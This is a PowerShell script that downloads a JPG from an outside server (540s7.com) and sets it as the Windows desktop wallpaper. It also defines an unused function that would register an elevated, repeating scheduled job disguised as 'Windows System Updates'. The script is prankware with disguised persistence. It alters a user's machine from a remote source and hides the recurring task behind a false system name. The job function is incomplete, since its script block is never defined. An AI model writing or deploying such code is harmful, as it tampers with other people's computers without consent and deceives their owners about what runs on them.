$setwallpapersrc = @"
using System.Runtime.InteropServices;
public class wallpaper
{
public const int SetDesktopWallpaper = 20;
public const int UpdateIniFile = 0x01;
public const int SendWinIniChange = 0x02;
[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
public static void SetWallpaper ( string path )
{
SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
}
}
"@
Add-Type -TypeDefinition $setwallpapersrc

function DownloadImage()
{
    $seconds = Get-Date -UFormat %S
    try
    {
        $imageNum = $seconds.Substring(1)
    }
    catch
    {
        $imageNum = 0
    }

    $imageName = "$imageNum.jpg"

    if(Test-Path -Path "$Env:Temp\\$imageName")
    {
        Remove-Item -Path "$Env:Temp\\$imageName"
    }
  
    $imageURL = "http://540s7.com/pics/$imageName"
    Write-Host $imageURL
    (new-object System.Net.WebClient).DownloadFile($imageURL,"$Env:Temp\\$imageName");

    return $imageName
}

function ScheduleScript()
{
    $repeat = (New-TimeSpan -Minutes 7)
    $jobname = "Windows System Updates"
    $action = New-ScheduledTaskAction -Execute 'Powershell.exe' 
    $trigger = New-JobTrigger -Once -At (Get-Date).Date -RepeatIndefinitely -RepetitionInterval $repeat
    $options = New-ScheduledJobOption -RunElevated -ContinueIfGoingOnBattery -StartIfOnBattery
    Register-ScheduledJob -Name $jobname -ScriptBlock $scriptblock -Trigger $trigger -ScheduledJobOption $options
}

$file = DownloadImage

[wallpaper]::SetWallpaper("$Env:Temp\$file")